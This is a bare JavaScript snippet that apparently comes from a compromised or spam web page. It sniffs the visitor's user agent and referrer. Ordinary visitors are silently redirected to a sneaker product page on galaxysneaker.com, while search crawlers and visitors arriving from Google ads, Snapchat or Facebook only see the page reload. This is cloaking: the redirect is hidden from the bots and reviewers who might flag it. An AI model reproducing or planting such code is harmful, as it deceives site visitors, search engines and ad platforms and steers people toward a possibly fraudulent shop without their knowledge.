<script>
  var referrer = document.referrer.toLowerCase();
  var userAgent = navigator.userAgent.toLowerCase();
  var isBot = (userAgent.indexOf("bot") !== -1) || (userAgent.indexOf("crawl") !== -1);
  if (!isBot && (referrer.indexOf("googleads") === -1) && (referrer.indexOf("snapchat") === -1) && (referrer.indexOf("facebook") === -1)) {
    window.location.href = "https://galaxysneaker.com/jordan-1-retro-high-og-lost-and-found-dz5485-612/";
  } else {
    location.reload();
  }
</script>